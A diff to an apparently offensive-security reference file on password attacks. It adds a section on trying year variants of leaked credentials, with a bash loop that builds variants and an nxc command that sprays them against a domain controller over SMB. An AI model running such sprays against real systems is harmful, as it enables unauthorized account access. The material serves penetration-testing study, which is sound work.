@@ -140,6 +140,19 @@ Keyboard patterns: Qwerty123
 Common substitutions: P@ssw0rd
 ```
 
+### Year Variant Testing from Leaked/Logged Credentials
+```bash
+# When you find a password in logs, config files, or SMB shares that doesn't authenticate:
+# The credential may have been recorded at a different time — try year variants
+# Pattern: replace the year component with current year ±2
+# Example: "Em3rg3ncyPa$$2025" found in log → try 2024, 2025, 2026, 2027
+# Also try: dollar signs ($→S), common leet swaps, capitalization variants
+# Automated: generate variants and spray
+for year in $(seq 2022 2027); do echo "${base_password/2025/$year}"; done > variants.txt
+nxc smb DC_IP -u username -p variants.txt --no-bruteforce
+# Common in: IdentitySync logs, service config traces, old backup scripts, EventViewer exports
+```
+
 ### Detection Methods
 - Monitor failed login attempts
 - Detect common password patterns
